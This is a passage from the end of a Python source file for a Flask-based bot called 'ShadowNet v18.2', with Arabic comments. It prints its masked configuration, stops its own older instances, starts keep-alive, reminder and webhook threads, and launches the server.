            logger.error(f"⚠️ آخر خطأ: {info.last_error_message}")

    except Exception as e:
        logger.error(f"❌ Webhook setup error: {e}")

# ===================== التشغيل النهائي =====================
if __name__ == '__main__':
    print("\n" + "=" * 60)
    print("🤖 ShadowNet v18.2 - النسخة المُصلَحة نهائياً")
    print(f"📌 Token: {'*' * 20}{TOKEN[-8:] if len(TOKEN) > 8 else 'N/A'}")
    print(f"📌 Admin ID: {ADMIN_ID}")
    print(f"📌 Server URL: {SERVER_URL}")
    print(f"📌 Webhook URL: {WEBHOOK_URL}")
    print(f"📌 Port: {PORT}")
    print("=" * 60 + "\n")

    # 1. قتل النسخ القديمة
    try:
        killed = force_kill_old_instances()
        if killed > 0:
            print(f"🔪 تم قتل {killed} نسخة قديمة")
    except Exception as e:
        print(f"⚠️ تعذر قتل النسخ القديمة: {e}")

    # 2. بدء مهام الخلفية
    threading.Thread(target=keep_alive, daemon=True).start()
    threading.Thread(target=check_reminders, daemon=True).start()

    # 3. تعيين Webhook في Thread منفصل
    threading.Thread(target=setup_webhook_with_delay, daemon=True).start()

    # 4. تشغيل Flask
    print("🚀 بدء تشغيل الخادم...\n")
    app.run(host='0.0.0.0', port=PORT, debug=False, threaded=True, use_reloader=False)
